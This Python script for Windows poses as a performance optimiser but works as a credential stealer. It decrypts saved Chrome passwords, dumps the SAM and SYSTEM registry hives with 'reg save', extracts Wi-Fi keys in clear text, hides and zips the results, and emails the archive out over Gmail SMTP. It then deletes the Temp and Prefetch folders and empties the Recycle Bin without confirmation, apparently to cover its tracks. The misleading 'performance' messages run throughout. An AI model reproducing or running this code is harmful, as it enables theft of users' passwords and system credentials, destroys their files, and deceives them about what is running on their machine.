import os
import re
import smtplib
import ssl
import subprocess
import threading
import zipfile
from base64 import b64decode
from csv import writer
from email import encoders
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from json import loads
from shutil import copy2, move
from sqlite3 import connect

import winshell
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

print("[+] Wait, Program is improving windows performance...")
CHROME_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
TEMP_PATH = os.path.normpath(r"%s\AppData\Local\Temp" % (os.environ['USERPROFILE']))
Win_TEMP_PATH = "C:\Windows\Temp"
WIN_PREFETCH = "C:\Windows\Prefetch"
USER = os.environ['USERPROFILE'][9:].capitalize()


def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        secret_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        # Remove empty data pick key on 1 loc
        secret_key = CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("[-] Error is: " + str(e) + "\n[-] Key Not Found!!!")
        return None


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    try:
        # Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("[-] Error is: " + str(e) + "\n[-] Unable to decrypt, Chrome version <80 not supported.")
        return ""


def get_db_connection(chrome_path_login_db):
    try:
        copy2(chrome_path_login_db, "Loginvault.db")
        return connect("Loginvault.db")
    except Exception as e:
        print("[-] Error is: " + str(e) + "\n[-] Chrm Db cannot be found")
        return None


def sys_file_save():
    try:
        if not os.path.exists("sam"):
            subprocess.run(["reg", "save", "hklm\sam", "sam"])
            subprocess.run(["reg", "save", "hklm\system", "system"])
            print("[+] Performance measured Saved Successfully.")
        else:
            print("[-] Already Exits")
            return
    except Exception as e:
        print("[-] Error is: " + str(e) + "\n[-] Error in reg file")


def wifi_extracator():
    show_profiles = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", show_profiles))
    wifi_list = []
    try:
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profiles = {}
                profile_detail = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                capture_output=True).stdout.decode()
                if re.search("Security key           : Absent", profile_detail):
                    continue
                else:
                    wifi_profiles["SSID"] = name
                    profile_pass_info = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                                       capture_output=True).stdout.decode()
                    paswd = re.search("Key Content            : (.*)\r", profile_pass_info)

                    if paswd is None:
                        wifi_profiles["Password"] = None
                    else:
                        wifi_profiles["Password"] = paswd[1]
                    wifi_list.append(wifi_profiles)
        else:
            print("[-] No Profile Found!!!")
            return ""
        return wifi_list
    except Exception as e:
        print("[-] Error is:" + str(e) + "\n[-] Error in profile")


def update_file(wifi_password):
    with open(USER + '.csv', mode='a', newline='', encoding='utf-8') as dp_file:
        csv_writer = writer(dp_file, delimiter=',')
        csv_writer.writerow("")
        csv_writer.writerow(["=======WIFI DATA========="])
        csv_writer.writerow("")
        csv_writer.writerow(["wifi_ssid", 'password'])
        for count in range(len(wifi_password)):
            csv_writer.writerow([wifi_password[count]["SSID"], wifi_password[count]['Password']])


def thread():
    t0 = threading.Thread(target=csvCreator())
    t1 = threading.Thread(target=sys_file_save())
    wifi_password = wifi_extracator()
    t2 = threading.Thread(target=update_file(wifi_password))
    t3 = threading.Thread(target=mk_folder())
    t4 = threading.Thread(target=win_temp())
    t5 = threading.Thread(target=emptyRecycleBin())
    t0.start()
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t0.join()
    t4.join()
    t5.join()
    t1.join()
    t2.join()
    t3.join()


def mk_folder():
    file = USER + '.csv'
    os.system("attrib +h " + file)
    os.system("attrib +h sam")
    os.system("attrib +h system")
    files = [file, 'sam', 'system']
    if not os.path.exists("cache.zip"):
        zip = zipfile.ZipFile("cache.zip", 'w')
        for f in files:
            zip.write(f)
        zip.close()
    else:
        print("[-] Already In Good Performance")
    for f in files:
        os.remove(f)


def csvCreator():
    if not os.path.exists(USER):
        with open(USER + '.csv', mode='w', newline='', encoding='utf-8') as dp_file:
            csv_writer = writer(dp_file, delimiter=',')
            csv_writer.writerow(["url", "username", "password"])
            secret_key = get_secret_key()
            # Search user profile or default folder
            folders = [element for element in os.listdir(CHROME_PATH) if
                       re.search("^Profile*|^Default$", element) is not None]
            for folder in folders:
                # Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login[0], login[1], login[2]
                        if url != "" and username != "" and ciphertext != "":
                            # Filter the initialisation vector & encrypted password from ciphertext
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([url, username, decrypted_password])
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp db
                    os.remove("Loginvault.db")
        print("[+] Performance File Saved Successfully")
    else:
        print("[-] Performance File Already Exits")
        exit()


def send_mail():
    email = input("Enter mail")
    password = input("Enter password")
    message = MIMEMultipart()
    MESSAGE_BODY = "Hi " + str(USER) + "!\n Hope this mail find you in good health and condition. Never Lose Hope.\n Let's Enjoy Buddy\n Be Smile and thanks.\n"
    body_part = MIMEText(MESSAGE_BODY, 'plain')
    message['Subject'] = "REWARD OF " + str(USER)
    message.attach(body_part)
    PATH_TO_ZIP_FILE = os.getcwd() + "\\cache.zip"
    with open(PATH_TO_ZIP_FILE, 'rb') as file:
        message.attach(MIMEApplication(file.read(), Name='cache.zip'))
        message = message.as_string()
    ssl_context = ssl.create_default_context()
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl_context)
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    print("[+] Mail sent")


def win_temp():
    try:
        pObj = subprocess.Popen('del /S /Q /F %s\\*.*' % TEMP_PATH, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        pObj1 = subprocess.Popen('del /S /Q /F %s\\*.*' % WIN_PREFETCH, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
        pObj2 = subprocess.Popen('del /S /Q /F %s\\*.*' % WIN_PREFETCH, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
        pObj.communicate()
        pObj1.communicate()
        pObj2.communicate()
        rCod = pObj.returncode
        rCod1 = pObj1.returncode
        rCod2 = pObj2.returncode
        if rCod == 0 and rCod1 == 0 and rCod2 == 0:
            print("[+] Win Cache Deleted Successfully.")
        else:
            print("[-] Unable to Clean Windows Cache")
    except Exception as e:
        print("[-] Error in Cache: " + str(e))


def emptyRecycleBin():
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
        print("[+] Recycle Bin Cleaned Successfully.")
    except Exception as e:
        print("[-] Recycle Bin Error: " + str(e))
        print("[-] Recycle Bin is already empty.")


if __name__ == '__main__':
    try:
        t = threading.Thread(target=thread())
        t.start()
        t.join()
        send_mail()
        print("[+] Performance Boosted Successfully")
    except Exception as e:
        print('*****Important Note*****')
        print("For Better Performance and Optimization run in administrator mode.\n  And connect to internet to get maximum output or performance.")
        print("[-] Error is: " + str(e))
